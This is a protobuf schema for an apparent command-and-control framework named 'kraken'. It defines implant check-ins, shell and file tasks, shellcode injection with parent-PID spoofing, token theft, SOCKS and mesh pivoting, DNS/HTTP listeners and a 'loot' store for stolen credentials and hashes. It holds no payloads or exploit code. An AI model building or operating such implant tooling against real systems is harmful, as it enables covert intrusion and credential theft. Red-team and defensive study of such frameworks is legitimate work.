syntax = "proto3";
package kraken;

// ============================================================================
// Common Types
// ============================================================================

message Uuid {
  bytes value = 1;  // 16 bytes
}

message Timestamp {
  int64 millis = 1;  // Unix timestamp in milliseconds
}

message ProtocolVersion {
  uint32 major = 1;
  uint32 minor = 2;
  uint32 patch = 3;
}

// ============================================================================
// System Information
// ============================================================================

message SystemInfo {
  string hostname = 1;
  string username = 2;
  string domain = 3;
  string os_name = 4;
  string os_version = 5;
  string os_arch = 6;
  uint32 process_id = 7;
  string process_name = 8;
  string process_path = 9;
  bool is_elevated = 10;
  string integrity_level = 11;
  repeated string local_ips = 12;
}

// ============================================================================
// Registration
// ============================================================================

message ImplantRegistration {
  bytes ephemeral_public_key = 1;  // X25519 public key (32 bytes)
  SystemInfo system_info = 2;
  bytes config_hash = 3;  // SHA256 of baked config
  ProtocolVersion protocol_version = 4;
}

message RegistrationResponse {
  Uuid implant_id = 1;
  bytes server_public_key = 2;  // X25519 public key (32 bytes)
  string assigned_name = 3;  // Water-themed name
  uint32 checkin_interval = 4;  // Seconds
  uint32 jitter_percent = 5;  // 0-100
}

// ============================================================================
// Check-in
// ============================================================================

message CheckIn {
  Uuid implant_id = 1;
  Timestamp local_time = 2;
  repeated TaskResponse task_responses = 3;
  repeated string loaded_modules = 4;
}

message CheckInResponse {
  repeated Task tasks = 1;
  optional uint32 new_checkin_interval = 2;
  optional uint32 new_jitter_percent = 3;
  repeated ImplantCommand commands = 4;
}

message ImplantCommand {
  oneof command {
    SleepCommand sleep = 1;
    ExitCommand exit = 2;
    UpdateConfigCommand update_config = 3;
  }
}

message SleepCommand {
  uint32 duration_seconds = 1;
}

message ExitCommand {
  bool clean = 1;  // Graceful exit if true
}

message UpdateConfigCommand {
  optional uint32 checkin_interval = 1;
  optional uint32 jitter_percent = 2;
}

// ============================================================================
// Tasks
// ============================================================================

message Task {
  Uuid task_id = 1;
  string task_type = 2;  // "shell", "sleep", "exit", etc.
  bytes task_data = 3;  // Serialized task-specific message
  Timestamp issued_at = 4;
  Uuid operator_id = 5;
}

message TaskResponse {
  Uuid task_id = 1;
  TaskStatus status = 2;
  oneof result {
    TaskSuccess success = 3;
    TaskError error = 4;
    TaskStreaming streaming = 5;
  }
  Timestamp completed_at = 6;
}

enum TaskStatus {
  TASK_STATUS_UNSPECIFIED = 0;
  TASK_STATUS_QUEUED = 1;      // Waiting for implant check-in
  TASK_STATUS_DISPATCHED = 2;  // Sent to implant, awaiting result
  TASK_STATUS_COMPLETED = 3;   // Success
  TASK_STATUS_FAILED = 4;      // Error
  TASK_STATUS_CANCELLED = 5;   // Operator cancelled
  TASK_STATUS_EXPIRED = 6;     // Implant lost or timeout
}

message TaskSuccess {
  bytes result_data = 1;  // Serialized task-specific result
}

message TaskError {
  int32 code = 1;
  string message = 2;
  optional string details = 3;
}

message TaskStreaming {
  uint32 sequence = 1;
  bytes chunk_data = 2;
  bool is_final = 3;
}

// ============================================================================
// Task Types (Phase 1)
// ============================================================================

message ShellTask {
  string command = 1;
  optional string shell = 2;  // Override default shell
  optional uint32 timeout_ms = 3;
}

message ShellResult {
  string stdout = 1;
  string stderr = 2;
  int32 exit_code = 3;
  uint64 duration_ms = 4;
}

message SleepTask {
  uint32 interval = 1;   // Check-in interval in seconds
  uint32 jitter = 2;     // Jitter percentage (0-100)
}

message SleepResult {
  uint32 old_interval = 1;
  uint32 old_jitter = 2;
  uint32 new_interval = 3;
  uint32 new_jitter = 4;
}

// ============================================================================
// Task Types (Phase 2 - mod-file)
// ============================================================================

message FileTask {
  oneof operation {
    FileList list = 1;
    FileRead read = 2;
    FileWrite write = 3;
    FileDelete delete = 4;
    FileUpload upload = 5;
    FileDownload download = 6;
    FileUploadChunked upload_chunked = 7;
    FileDownloadChunked download_chunked = 8;
  }
}

message FileList {
  string path = 1;
  bool recursive = 2;
}

message FileRead {
  string path = 1;
  optional uint64 offset = 2;
  optional uint64 length = 3;
}

message FileWrite {
  string path = 1;
  bytes data = 2;
  bool append = 3;
}

message FileDelete {
  string path = 1;
  bool recursive = 2;
}

message FileUpload {
  string remote_path = 1;
  bytes data = 2;
}

message FileDownload {
  string remote_path = 1;
}

// Chunked file upload (for large files)
message FileUploadChunked {
  string transfer_id = 1;      // UUID for this transfer
  string remote_path = 2;      // Destination path
  uint64 total_size = 3;       // Total file size in bytes
  uint64 chunk_index = 4;      // Current chunk number (0-based)
  uint64 total_chunks = 5;     // Total number of chunks
  bytes chunk_data = 6;        // This chunk's data (up to 1MB)
  bytes checksum = 7;          // SHA256 of this chunk
}

// Chunked file download request (for large files)
message FileDownloadChunked {
  string transfer_id = 1;      // UUID for this transfer
  string remote_path = 2;      // File to download
  uint64 chunk_index = 3;      // Which chunk to send (0-based)
  uint64 chunk_size = 4;       // Bytes per chunk (default 1MB)
}

// Chunked download response
message FileDownloadChunkResponse {
  string transfer_id = 1;      // Matches request
  uint64 total_size = 2;       // Total file size
  uint64 chunk_index = 3;      // This chunk number
  uint64 total_chunks = 4;     // Total chunks
  bytes chunk_data = 5;        // This chunk's data
  bytes checksum = 6;          // SHA256 of chunk
  bool is_final = 7;           // True if last chunk
}

// Transfer status/progress
message FileTransferStatus {
  string transfer_id = 1;
  string file_path = 2;
  uint64 total_size = 3;
  uint64 bytes_transferred = 4;
  uint64 chunks_completed = 5;
  uint64 total_chunks = 6;
  TransferState state = 7;
  optional string error = 8;
}

enum TransferState {
  TRANSFER_STATE_UNSPECIFIED = 0;
  TRANSFER_STATE_INITIALIZING = 1;
  TRANSFER_STATE_IN_PROGRESS = 2;
  TRANSFER_STATE_PAUSED = 3;
  TRANSFER_STATE_COMPLETED = 4;
  TRANSFER_STATE_FAILED = 5;
}

// File operation results
message DirectoryListing {
  string path = 1;
  repeated DirectoryEntry entries = 2;
}

message DirectoryEntry {
  string name = 1;
  bool is_dir = 2;
  uint64 size = 3;
  optional int64 modified = 4;  // Unix timestamp
  optional string permissions = 5;
}

message FileContents {
  string path = 1;
  bytes data = 2;
  uint64 size = 3;
}

message FileOperationResult {
  string operation = 1;
  string path = 2;
  bool success = 3;
  optional uint64 bytes_written = 4;
}

// ============================================================================
// Task Types (Phase 2 - mod-bof)
// ============================================================================

message BofTask {
  bytes bof_data = 1;          // COFF object file bytes
  optional string entry_point = 2;  // Entry function name (default: "go")
  optional bytes arguments = 3;     // Packed arguments for the BOF
}

message BofResult {
  string output = 1;           // Captured BeaconOutput
  int32 exit_code = 2;         // Exit code (0 = success)
  optional string error = 3;   // Error message if failed
}

// ============================================================================
// Task Types (Phase 7 - mod-inject)
// ============================================================================

message InjectTask {
  uint32 target_pid = 1;       // Target process ID (0 = Early Bird creates new)
  bytes shellcode = 2;         // Shellcode bytes to inject
  InjectionMethod method = 3;  // Injection technique
  bool wait = 4;               // Wait for injected thread to complete
  uint32 timeout_ms = 5;       // Timeout in milliseconds (0 = infinite)
  optional uint32 parent_pid = 6;  // Spoof this PID as parent (T1134.004); absent = no spoofing
}

message InjectResult {
  bool success = 1;
  uint32 thread_id = 2;        // Created/hijacked thread ID
  string technique_used = 3;   // Which technique succeeded
  optional string error = 4;   // Error message if failed
}

// ============================================================================
// Task Types (Phase 7 - mod-token)
// ============================================================================

message TokenTask {
  oneof operation {
    TokenSteal steal = 1;
    TokenMake make = 2;
    TokenImpersonate impersonate = 3;
    TokenRevSelf rev2self = 4;
    TokenEnablePriv enable_priv = 5;
    TokenList list = 6;
  }
}

message TokenSteal {
  uint32 target_pid = 1;       // Process to steal token from
}

message TokenMake {
  string username = 1;
  string password = 2;
  optional string domain = 3;  // Defaults to "." (local)
}

message TokenImpersonate {
  uint32 token_id = 1;         // ID from token store
}

message TokenRevSelf {}        // No parameters needed

message TokenEnablePriv {
  string privilege = 1;        // e.g., "SeDebugPrivilege"
}

message TokenList {}           // No parameters needed

message TokenResult {
  bool success = 1;
  optional uint32 token_id = 2;    // For steal/make operations
  optional string username = 3;    // For list operations
  repeated StoredTokenInfo tokens = 4;  // For list operations
  optional string error = 5;
}

message StoredTokenInfo {
  uint32 id = 1;
  string username = 2;
  string source = 3;           // "steal" or "make"
  uint32 source_pid = 4;       // If stolen, source process
}

// ============================================================================
// Task Types (Phase 7 - mod-socks)
// ============================================================================

message SocksTask {
  oneof operation {
    SocksConnect connect = 1;      // Server requests implant connect to target
    SocksData data = 2;            // Relay data through tunnel
    SocksDisconnect disconnect = 3; // Close a channel
  }
}

message SocksConnect {
  uint32 channel_id = 1;       // Channel identifier for multiplexing
  string target_host = 2;      // Target hostname or IP
  uint32 target_port = 3;      // Target port
}

message SocksData {
  uint32 channel_id = 1;
  bytes data = 2;
}

message SocksDisconnect {
  uint32 channel_id = 1;
}

message SocksResult {
  uint32 channel_id = 1;
  bool success = 2;
  optional bytes data = 3;     // Response data (for connect/data)
  optional string error = 4;
}

// ============================================================================
// Task Types (Phase 2 - Loot Store)
// ============================================================================

enum LootType {
  LOOT_TYPE_UNSPECIFIED = 0;
  LOOT_TYPE_CREDENTIAL = 1;
  LOOT_TYPE_HASH = 2;
  LOOT_TYPE_TOKEN = 3;
  LOOT_TYPE_FILE = 4;
}

message LootEntry {
  Uuid id = 1;
  Uuid implant_id = 2;
  LootType loot_type = 3;
  string source = 4;              // Where this loot came from (module, technique)
  Timestamp collected_at = 5;
  oneof data {
    CredentialLoot credential = 10;
    HashLoot hash = 11;
    TokenLoot token = 12;
    FileLoot file = 13;
  }
}

message CredentialLoot {
  string username = 1;
  string password = 2;
  optional string domain = 3;
  optional string realm = 4;      // Kerberos realm, HTTP realm, etc.
  optional string host = 5;       // Target host if applicable
}

message HashLoot {
  string username = 1;
  string hash = 2;
  string hash_type = 3;           // NTLM, NTLMv2, Kerberos, etc.
  optional string domain = 4;
}

message TokenLoot {
  string token_type = 1;          // JWT, API key, session cookie, etc.
  string token_value = 2;
  optional string service = 3;    // What service this token is for
  optional Timestamp expires_at = 4;
}

message FileLoot {
  string filename = 1;
  string original_path = 2;
  bytes content = 3;
  uint64 size = 4;
  optional string description = 5;
}

// Loot service messages
message StoreLootRequest {
  Uuid implant_id = 1;
  LootType loot_type = 2;
  string source = 3;
  oneof data {
    CredentialLoot credential = 10;
    HashLoot hash = 11;
    TokenLoot token = 12;
    FileLoot file = 13;
  }
}

message StoreLootResponse {
  Uuid loot_id = 1;
}

message GetLootRequest {
  Uuid loot_id = 1;
}

message ListLootRequest {
  optional Uuid implant_id = 1;
  optional LootType type_filter = 2;
  optional uint32 limit = 3;
  optional uint32 offset = 4;
}

message ListLootResponse {
  repeated LootEntry entries = 1;
  uint32 total_count = 2;
}

message DeleteLootRequest {
  Uuid loot_id = 1;
}

message DeleteLootResponse {
  bool success = 1;
}

message ExportLootRequest {
  optional Uuid implant_id = 1;
  optional LootType type_filter = 2;
  string format = 3;              // "json", "csv"
}

message ExportLootResponse {
  bytes data = 1;
  string filename = 2;
}

message SearchLootRequest {
  string query = 1;   // FTS5 query string
  int32 limit = 2;    // Maximum results to return (0 = server default of 100)
}

message SearchLootResponse {
  repeated LootEntry entries = 1;
  uint32 total_count = 2;
}

// ============================================================================
// Task Types (Phase 3 - mod-module)
// ============================================================================

message ModuleTask {
  oneof operation {
    ModuleLoad load = 1;
    ModuleUnload unload = 2;
    ModuleList list = 3;
  }
}

message ModuleLoad {
  bytes module_blob = 1;
}

message ModuleUnload {
  string module_id = 1;
}

message ModuleList {}

message ModuleOperationResult {
  string operation = 1;
  string module_id = 2;
  bool success = 3;
  optional string message = 4;
  repeated LoadedModuleInfo loaded_modules = 5;
}

message LoadedModuleInfo {
  string module_id = 1;
  string name = 2;
  string version = 3;
  int64 loaded_at = 4;
  uint64 memory_size = 5;
}

// Module service messages
message ModuleInfo {
  string id = 1;
  string name = 2;
  optional string description = 3;
  repeated PlatformVersion platforms = 4;
}

message PlatformVersion {
  string platform = 1;
  string version = 2;
  uint64 size = 3;
  int64 compiled_at = 4;
}

message ListModulesRequest {}
message ListModulesResponse {
  repeated ModuleInfo modules = 1;
}

message LoadModuleRequest {
  bytes implant_id = 1;
  string module_id = 2;
  optional string version = 3;
}

message UnloadModuleRequest {
  bytes implant_id = 1;
  string module_id = 2;
}

// ============================================================================
// Mesh Networking (Phase 5)
// ============================================================================

message MeshTask {
  oneof operation {
    MeshConnect connect = 1;
    MeshDisconnect disconnect = 2;
    MeshSetRole set_role = 3;
    MeshGetTopology get_topology = 4;
    MeshRelay relay = 5;
    MeshListen listen = 6;
    MeshSocksConnect socks_connect = 7;
    MeshSocksData socks_data = 8;
  }
}

message MeshConnect {
  bytes peer_id = 1;              // Target implant ID (16 bytes)
  MeshTransportType transport = 2;
  string address = 3;             // IP or hostname
  uint32 port = 4;                // TCP port (if TCP)
  string pipe_name = 5;           // Named pipe name (if SMB)
  bytes peer_public_key = 6;      // Optional pre-shared public key
}

message MeshDisconnect {
  bytes peer_id = 1;
}

message MeshSetRole {
  MeshRoleType role = 1;
}

message MeshGetTopology {}

message MeshRelay {
  bytes message = 1;  // Encrypted MeshMessage
}

message MeshListen {
  uint32 port = 1;
  MeshTransportType transport = 2;
  string bind_address = 3;          // Default "0.0.0.0"
  string pipe_name = 4;             // For SMB transport
}

// SOCKS5 proxy through mesh
message MeshSocksConnect {
  uint32 channel_id = 1;            // Unique ID for this SOCKS channel
  string target_host = 2;           // Target hostname or IP
  uint32 target_port = 3;           // Target port
}

message MeshSocksData {
  uint32 channel_id = 1;            // Channel ID
  bytes data = 2;                   // Payload data
  bool eof = 3;                     // End of stream
}

message MeshSocksResponse {
  uint32 channel_id = 1;
  bool success = 2;
  string error = 3;                 // Error message if failed
  string bound_addr = 4;            // Bound address (for SOCKS response)
  uint32 bound_port = 5;            // Bound port
}

enum MeshTransportType {
  MESH_TRANSPORT_UNKNOWN = 0;
  MESH_TRANSPORT_SMB = 1;
  MESH_TRANSPORT_TCP = 2;
}

enum MeshRoleType {
  MESH_ROLE_LEAF = 0;
  MESH_ROLE_RELAY = 1;
  MESH_ROLE_HUB = 2;
}

message MeshPeerReport {
  bytes peer_id = 1;
  MeshTransportType transport = 2;
  MeshLinkState link_state = 3;
  int64 last_seen = 4;
  uint64 messages_sent = 5;
  uint64 messages_received = 6;
  uint32 latency_ms = 7;
}

enum MeshLinkState {
  MESH_LINK_CONNECTING = 0;
  MESH_LINK_HANDSHAKING = 1;
  MESH_LINK_ACTIVE = 2;
  MESH_LINK_DEGRADED = 3;
  MESH_LINK_FAILED = 4;
}

message MeshTopologyUpdate {
  bytes node_id = 1;
  MeshEvent event = 2;
}

message MeshEvent {
  oneof event_type {
    MeshTopologyReport topology_report = 1;
    MeshLinkEstablished link_established = 2;
    MeshLinkRemoved link_removed = 3;
    MeshLinkStateChanged link_state_changed = 4;
  }
}

message MeshTopologyReport {
  MeshRoleType role = 1;
  repeated MeshPeerReport peers = 2;
}

message MeshLinkEstablished {
  bytes peer_id = 1;
  MeshTransportType transport = 2;
}

message MeshLinkRemoved {
  bytes peer_id = 1;
}

message MeshLinkStateChanged {
  bytes peer_id = 1;
  MeshLinkState old_state = 2;
  MeshLinkState new_state = 3;
}

message MeshRoute {
  bytes source = 1;
  bytes destination = 2;
  repeated bytes hops = 3;
  int64 computed_at = 4;
}

// ============================================================================
// Message Envelope (for HTTP transport)
// ============================================================================

message MessageEnvelope {
  MessageType message_type = 1;
  bytes payload = 2;  // Encrypted or plaintext depending on state
}

enum MessageType {
  MESSAGE_TYPE_UNSPECIFIED = 0;
  MESSAGE_TYPE_REGISTRATION = 1;
  MESSAGE_TYPE_CHECKIN = 2;
  MESSAGE_TYPE_TASK_RESPONSE = 3;
}

// ============================================================================
// Implant State
// ============================================================================

enum ImplantState {
  IMPLANT_STATE_UNSPECIFIED = 0;
  IMPLANT_STATE_STAGING = 1;
  IMPLANT_STATE_ACTIVE = 2;
  IMPLANT_STATE_LOST = 3;
  IMPLANT_STATE_BURNED = 4;
  IMPLANT_STATE_RETIRED = 5;
}

// ============================================================================
// gRPC Service Messages
// ============================================================================

// Implant Service
message Implant {
  Uuid id = 1;
  string name = 2;
  ImplantState state = 3;
  SystemInfo system_info = 4;
  uint32 checkin_interval = 5;
  uint32 jitter_percent = 6;
  Timestamp registered_at = 7;
  Timestamp last_seen = 8;
  repeated string tags = 9;
  string notes = 10;
}

message ListImplantsRequest {
  optional ImplantState state_filter = 1;
  repeated string tag_filter = 2;
  optional string search = 3;
}

message ListImplantsResponse {
  repeated Implant implants = 1;
}

message GetImplantRequest {
  Uuid implant_id = 1;
}

message UpdateImplantRequest {
  Uuid implant_id = 1;
  optional string name = 2;
  repeated string tags = 3;
  optional string notes = 4;
  optional uint32 checkin_interval = 5;
  optional uint32 jitter_percent = 6;
}

message BurnImplantRequest {
  Uuid implant_id = 1;
  string reason = 2;
}

message RetireImplantRequest {
  Uuid implant_id = 1;
}

message DeleteImplantRequest {
  Uuid implant_id = 1;
}

message DeleteImplantResponse {
  bool success = 1;
}

message StreamImplantEventsRequest {}

message ImplantEvent {
  Timestamp timestamp = 1;
  oneof event {
    ImplantRegisteredEvent registered = 2;
    ImplantCheckedInEvent checked_in = 3;
    ImplantLostEvent lost = 4;
    ImplantRecoveredEvent recovered = 5;
    ImplantBurnedEvent burned = 6;
    ImplantRetiredEvent retired = 7;
  }
}

message ImplantRegisteredEvent {
  Uuid implant_id = 1;
  string name = 2;
  string hostname = 3;
  string username = 4;
  string os = 5;
}

message ImplantCheckedInEvent {
  Uuid implant_id = 1;
}

message ImplantLostEvent {
  Uuid implant_id = 1;
}

message ImplantRecoveredEvent {
  Uuid implant_id = 1;
}

message ImplantBurnedEvent {
  Uuid implant_id = 1;
  Uuid operator_id = 2;
  string reason = 3;
}

message ImplantRetiredEvent {
  Uuid implant_id = 1;
  Uuid operator_id = 2;
}

// Task Service
message DispatchTaskRequest {
  Uuid implant_id = 1;
  string task_type = 2;
  bytes task_data = 3;
}

message DispatchTaskResponse {
  Uuid task_id = 1;
}

message GetTaskRequest {
  Uuid task_id = 1;
}

message TaskInfo {
  Uuid task_id = 1;
  Uuid implant_id = 2;
  Uuid operator_id = 3;
  string task_type = 4;
  TaskStatus status = 5;
  Timestamp issued_at = 6;
  Timestamp dispatched_at = 7;
  Timestamp completed_at = 8;
  bytes result_data = 9;
  optional TaskError error = 10;
}

message ListTasksRequest {
  optional Uuid implant_id = 1;
  optional TaskStatus status_filter = 2;
  optional uint32 limit = 3;
}

message ListTasksResponse {
  repeated TaskInfo tasks = 1;
}

message CancelTaskRequest {
  Uuid task_id = 1;
}

message StreamTaskResultsRequest {
  optional Uuid implant_id = 1;
}

message TaskResultEvent {
  Uuid task_id = 1;
  Uuid implant_id = 2;
  TaskStatus status = 3;
  bytes result_data = 4;
  optional TaskError error = 5;
  Timestamp completed_at = 6;
}

message GetTransferStatusRequest {
  string transfer_id = 1;
}

message ListActiveTransfersRequest {
  optional Uuid implant_id = 1;
}

message ListActiveTransfersResponse {
  repeated FileTransferStatus transfers = 1;
}

// Listener Service
message Listener {
  Uuid id = 1;
  string listener_type = 2;  // "http", "https"
  string bind_host = 3;
  uint32 bind_port = 4;
  string profile_id = 5;
  bool is_running = 6;
  Timestamp started_at = 7;
  uint64 connections_total = 8;
}

message StartListenerRequest {
  string listener_type = 1;  // "http", "https", "dns"
  string bind_host = 2;
  uint32 bind_port = 3;
  string profile_id = 4;
  optional string tls_cert_path = 5;
  optional string tls_key_path = 6;
  // DNS-specific configuration (used when listener_type = "dns")
  optional string dns_domain = 7;  // Base domain for C2 (e.g., "c2.example.com")
}

message StopListenerRequest {
  Uuid listener_id = 1;
}

message ListListenersRequest {}

message ListListenersResponse {
  repeated Listener listeners = 1;
}

// Operator Service
message Operator {
  Uuid id = 1;
  string username = 2;
  string role = 3;
  Timestamp created_at = 4;
  Timestamp last_seen = 5;
  bool is_active = 6;

  // RBAC: Restrict operator to specific sessions (empty = no restriction)
  repeated bytes allowed_sessions = 10;

  // RBAC: Restrict operator to specific listeners (empty = no restriction)
  repeated bytes allowed_listeners = 11;

  // RBAC: Scope type ("global" | "scoped")
  string scope = 12;
}

message GetSelfRequest {}

message ListOperatorsRequest {}

message ListOperatorsResponse {
  repeated Operator operators = 1;
}

message CreateOperatorRequest {
  string username = 1;
  string password = 2;
  string role = 3;  // "admin", "operator", "viewer"
}

message UpdateOperatorRequest {
  bytes operator_id = 1;
  optional string role = 2;
  optional bool disabled = 3;
}

message DeleteOperatorRequest {
  bytes operator_id = 1;
}

message DeleteOperatorResponse {
  bool success = 1;
}

// Mesh Service Messages
message GetTopologyRequest {}

message MeshTopology {
  repeated MeshNode nodes = 1;
  repeated MeshLink links = 2;
}

message MeshNode {
  bytes implant_id = 1;
  MeshRoleType role = 2;
  bool has_egress = 3;
}

message MeshLink {
  bytes from_id = 1;
  bytes to_id = 2;
  MeshTransportType transport = 3;
  MeshLinkState state = 4;
  uint32 latency_ms = 5;
}

message StreamTopologyRequest {}

message ConnectPeerRequest {
  bytes implant_id = 1;    // Source implant
  bytes peer_id = 2;       // Target peer
  MeshTransportType transport = 3;
  string address = 4;
  uint32 port = 5;
  string pipe_name = 6;
}

message DisconnectPeerRequest {
  bytes implant_id = 1;
  bytes peer_id = 2;
}

message SetRoleRequest {
  bytes implant_id = 1;
  MeshRoleType role = 2;
}

message MeshListenRequest {
  bytes implant_id = 1;
  uint32 port = 2;
  MeshTransportType transport = 3;
  string bind_address = 4;          // Optional, default "0.0.0.0"
}

message ComputeRouteRequest {
  bytes from_id = 1;
  bytes to_id = 2;
  uint32 max_paths = 3;  // For multi-path routing
}

message ComputeRouteResponse {
  repeated MeshRoute routes = 1;
}

